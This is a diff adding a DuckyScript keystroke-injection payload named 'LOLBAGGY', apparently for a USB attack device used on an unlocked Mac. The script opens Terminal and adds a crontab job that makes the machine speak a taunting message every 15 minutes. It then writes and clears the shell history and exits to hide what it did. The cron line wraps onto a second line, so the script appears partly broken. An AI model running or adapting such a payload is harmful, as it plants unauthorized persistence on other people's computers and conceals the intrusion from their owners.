@@ -1,0 +1,29 @@
+REM LOLBAGGY
+DELAY 4000
+GUI SPACE
+DELAY 4000
+STRING terminal
+DELAY 4000
+ENTER
+STRING crontab -e
+DELAY 4000
+ENTER
+STRING i
+DELAY 4000
+STRING */15 * * * * say -v cellos oh my pants are so baggy so baggy watch them
+sag I should learn to lock my computer
+DELAY 4000
+ESCAPE
+DELAY 4000
+STRING :wq
+ENTER
+DELAY 4000
+STRING history -w
+DELAY 4000
+ENTER
+STRING history -c
+DELAY 4000
+ENTER
+STRING exit
+DELAY 4000
+ENTER
